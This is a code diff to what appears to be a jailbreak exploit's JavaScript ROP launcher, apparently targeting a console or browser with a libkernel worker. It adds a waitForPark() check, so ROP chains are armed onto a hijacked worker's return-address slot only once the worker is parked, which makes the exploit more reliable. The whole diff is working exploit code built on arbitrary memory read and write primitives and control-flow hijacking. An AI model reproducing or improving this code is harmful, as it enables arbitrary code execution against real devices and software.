@@ -81,6 +81,14 @@ function log(message, type = "log") {
 }
 
 const ROP_WAIT_MS = 20000;
+// Time to wait for the worker to be parked in its libkernel wait before arming
+// a chain onto it, see waitForPark() in prepareRop().
+const ROP_PARK_MS = 10000;
+// restoreHook() writes the saved return-address fingerprint before the worker
+// has finished unwinding its message handler. Require a quiet interval with
+// that fingerprint before treating the slot as proof that the worker is ready
+// for another chain.
+const ROP_PARK_SETTLE_MS = 1;
 
 function jbmark(tag, detail) {
   try {
@@ -201,11 +209,43 @@ async function prepareRop(p) {
     p.write8(returnAddress, originalReturnAddress);
   }
 
+  // The chain is consumed by the worker's kernel-side wake `ret` through the
+  // armed slot, so the worker must be parked in the libkernel wait at launch
+  // time. If it is awake inside its JS event loop, postMessage(0) is consumed
+  // directly by JS and answered immediately without the staged chain running;
+  // armedCall() then reports the chain as never executed. When the worker is
+  // parked, its saved return slot holds `originalReturnAddress` (the
+  // libkernel worker-wait fingerprint captured at boot), so checking that slot
+  // before arming gates the launch on the park state.
+  function workerParked() {
+    const slot = p.read8(returnAddress);
+    return slot.hi === originalReturnAddress.hi && slot.low === originalReturnAddress.low;
+  }
+
+  async function waitForPark(what) {
+    const deadline = Date.now() + ROP_PARK_MS;
+    let parkedSince = null;
+    while (true) {
+      if (workerParked()) {
+        if (parkedSince === null) parkedSince = Date.now();
+        if (Date.now() - parkedSince >= ROP_PARK_SETTLE_MS) return;
+      } else {
+        parkedSince = null;
+      }
+
+      if (Date.now() >= deadline)
+        throw new Error(`the worker never returned to its parked slot before the ${what} - ` +
+          `refusing to arm a chain onto a worker that is awake. (Reload.)`);
+      await new Promise((resolve) => setTimeout(resolve, 1));
+    }
+  }
+
   // Launch chain without awaiting worker completion (for blocking syscalls like accept).
   // NOTE: this path intentionally leaves the hook installed, because the worker
   // consumes the slot when the pending syscall (accept) completes asynchronously;
   // net.js restores the chain via waitDetached().
-  function launchChainDetached(chain) {
+  async function launchChainDetached(chain) {
+    await waitForPark("detached chain launch");
     const originalStackPointer = p.read8(stackPointerSlot);
     chain.push_write8(originalContext, originalReturnAddress);
     chain.push_write8(originalContext.add32(0x10), returnAddress);
@@ -222,6 +262,7 @@ async function prepareRop(p) {
   }
 
   async function launchChain(chain) {
+    await waitForPark("chain launch");
     const originalStackPointer = p.read8(stackPointerSlot);
     chain.push_write8(originalContext, originalReturnAddress);
     chain.push_write8(originalContext.add32(0x10), returnAddress);
